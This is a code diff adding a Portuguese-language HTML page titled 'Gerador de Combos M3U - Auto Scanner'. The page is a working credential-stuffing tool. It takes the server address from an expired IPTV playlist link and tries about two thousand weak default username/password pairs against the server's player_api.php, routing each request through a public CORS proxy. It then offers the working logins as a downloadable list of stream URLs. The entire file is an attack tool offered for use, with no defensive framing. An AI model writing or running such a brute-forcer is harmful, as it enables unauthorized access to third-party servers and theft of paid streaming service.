@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Gerador de Combos M3U - Auto Scanner</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    input, button {
+      margin: 10px;
+      padding: 10px;
+      font-size: 16px;
+      width: 90%;
+    }
+    #resultado {
+      margin-top: 20px;
+      text-align: left;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    .ok { color: #00FF00; }
+    .fail { color: #FF4444; }
+  </style>
+</head>
+<body>
+  <h1>Gerador de Combos M3U</h1>
+  
+  <input type="text" id="m3u" placeholder="Cole aqui seu link M3U vencido">
+  <button onclick="iniciar()">Iniciar Scan</button>
+
+  <div id="resultado"></div>
+
+  <button id="baixar" style="display:none;" onclick="baixarAtivos()">Baixar Ativos</button>
+
+  <script>
+    let ativos = [];
+    let combos = [];
+
+    function gerarCombos() {
+      const bases = ['admin', 'user', 'teste', 'demo', 'iptv', 'root', 'guest', '1234', 'live', 'tv'];
+      const combosGerados = [];
+
+      bases.forEach(base => {
+        for (let i = 0; i <= 100; i++) {
+          combosGerados.push({user: base+i, pass: base+i});
+          combosGerados.push({user: base, pass: base});
+        }
+      });
+
+      combosGerados.push({user: 'user', pass: '1234'});
+      combosGerados.push({user: 'admin', pass: '1234'});
+      combosGerados.push({user: 'iptv', pass: 'iptv123'});
+      combosGerados.push({user: 'demo', pass: 'demo'});
+      combosGerados.push({user: 'root', pass: 'root'});
+
+      return combosGerados;
+    }
+
+    function extrairIpPorta(url) {
+      const regex = /https?:\/\/([^\/:]+):(\d+)/;
+      const match = url.match(regex);
+      if (match) {
+        return { ip: match[1], porta: match[2] };
+      }
+      return null;
+    }
+
+    async function iniciar() {
+      const m3u = document.getElementById('m3u').value.trim();
+      const resultadoDiv = document.getElementById('resultado');
+      ativos = [];
+      combos = gerarCombos();
+
+      if (!m3u) {
+        alert("Cole o link M3U vencido!");
+        return;
+      }
+
+      const extraido = extrairIpPorta(m3u);
+
+      if (!extraido) {
+        alert("Não foi possível extrair o IP e a Porta do link.");
+        return;
+      }
+
+      const { ip, porta } = extraido;
+
+      resultadoDiv.innerHTML = `[+] Gerando ${combos.length} combinações e testando...\nServidor: ${ip}:${porta}\n`;
+
+      for (let combo of combos) {
+        const status = await testarLogin(ip, porta, combo.user, combo.pass);
+        resultadoDiv.innerHTML += status + '\n';
+      }
+
+      if (ativos.length) {
+        document.getElementById('baixar').style.display = 'inline-block';
+        resultadoDiv.innerHTML += `\n[+] ${ativos.length} logins ativos encontrados.`;
+      } else {
+        resultadoDiv.innerHTML += `\n[-] Nenhum login ativo encontrado.`;
+      }
+    }
+
+    async function testarLogin(ip, porta, user, pass) {
+      const proxy = "https://corsproxy.io/?";
+      const url = `http://${ip}:${porta}/player_api.php?username=${user}&password=${pass}`;
+      
+      try {
+        const response = await fetch(proxy + encodeURIComponent(url));
+        const data = await response.json();
+        if (data.user_info && data.user_info.auth == 1) {
+          const conexoes = data.user_info.max_connections || 0;
+          ativos.push(`http://${ip}:${porta}/get.php?username=${user}&password=${pass}&type=m3u_plus&output=ts`);
+          return `<span class="ok">[ATIVO]</span> ${user}:${pass} - Conexões: ${conexoes}`;
+        } else {
+          return `<span class="fail">[INATIVO]</span> ${user}:${pass}`;
+        }
+      } catch (err) {
+        return `<span class="fail">[ERRO]</span> ${user}:${pass}`;
+      }
+    }
+
+    function baixarAtivos() {
+      const texto = ativos.join('\n');
+      const blob = new Blob([texto], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'ativos.txt';
+      a.click();
+      URL.revokeObjectURL(url);
+    }
+  </script>
+</body>
+</html>
